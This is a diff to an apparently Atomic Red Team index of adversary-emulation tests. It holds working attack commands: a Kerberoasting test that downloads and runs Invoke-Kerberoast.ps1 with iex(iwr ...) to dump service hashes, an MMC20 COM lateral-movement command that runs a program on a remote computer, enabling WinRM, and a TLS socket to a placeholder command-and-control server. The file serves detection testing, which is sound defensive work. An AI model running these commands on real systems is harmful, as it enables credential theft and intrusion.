@@ -20928,19 +20928,20 @@ credential-access:
       identifier: T1208
     atomic_tests:
     - name: Request for service tickets
-      description: |
-        This test uses the Powershell Empire Module: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
-
-        The following are further sources and credits for this attack:
-        [Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
-        [Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+      description: "This test uses the Powershell Empire Module: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\n\nThe
+        following are further sources and credits for this attack:\n[Kerberoasting
+        Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast
+        source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen
+        executed successfully , the test displays available services with their hashes.
+        \nIf the testing domain doesn't have any service principal name configured,
+        there is no output \n"
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
         command: |
-          Import-Module .\Invoke-Kerberoast.ps1
+          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
           Invoke-Kerberoast | fl
   T1142:
     technique:
@@ -25322,8 +25323,10 @@ execution:
       identifier: T1028
     atomic_tests:
     - name: Enable Windows Remote Management
-      description: "Powershell Enable WinRM\n\nUpon successful execution, powershell
-        will \"Enable-PSRemoting\" allowing for remote PS access. \n"
+      description: |
+        Powershell Enable WinRM
+
+        Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.
       supported_platforms:
       - windows
       executor:
@@ -25333,8 +25336,14 @@ execution:
 
 '
     - name: PowerShell Lateral Movement
-      description: "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon
-        successful execution, cmd will spawn calc.exe on a remote computer. \n"
+      description: |
+        Powershell lateral movement using the mmc20 application com object.
+
+        Reference:
+
+        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+
+        Upon successful execution, cmd will spawn calc.exe on a remote computer.
       supported_platforms:
       - windows
       input_arguments:
@@ -25343,8 +25352,8 @@ execution:
           type: string
           default: computer1
       executor:
-        name: command_prompt
-        command: 'powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+        name: powershell
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
 '
@@ -26822,8 +26831,10 @@ lateral-movement:
       identifier: T1028
     atomic_tests:
     - name: Enable Windows Remote Management
-      description: "Powershell Enable WinRM\n\nUpon successful execution, powershell
-        will \"Enable-PSRemoting\" allowing for remote PS access. \n"
+      description: |
+        Powershell Enable WinRM
+
+        Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.
       supported_platforms:
       - windows
       executor:
@@ -26833,8 +26844,14 @@ lateral-movement:
 
 '
     - name: PowerShell Lateral Movement
-      description: "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon
-        successful execution, cmd will spawn calc.exe on a remote computer. \n"
+      description: |
+        Powershell lateral movement using the mmc20 application com object.
+
+        Reference:
+
+        https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/
+
+        Upon successful execution, cmd will spawn calc.exe on a remote computer.
       supported_platforms:
       - windows
       input_arguments:
@@ -26843,8 +26860,8 @@ lateral-movement:
           type: string
           default: computer1
       executor:
-        name: command_prompt
-        command: 'powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
+        name: powershell
+        command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe",
           $null, $null, "7")
 
 '
@@ -29309,7 +29326,7 @@ command-and-control:
         command: |
           $server_ip = #{server_ip}
           $server_port = #{server_port}
-          $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', #{server_port})
+          $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
           $stream = $socket.GetStream()
           $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
           $sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
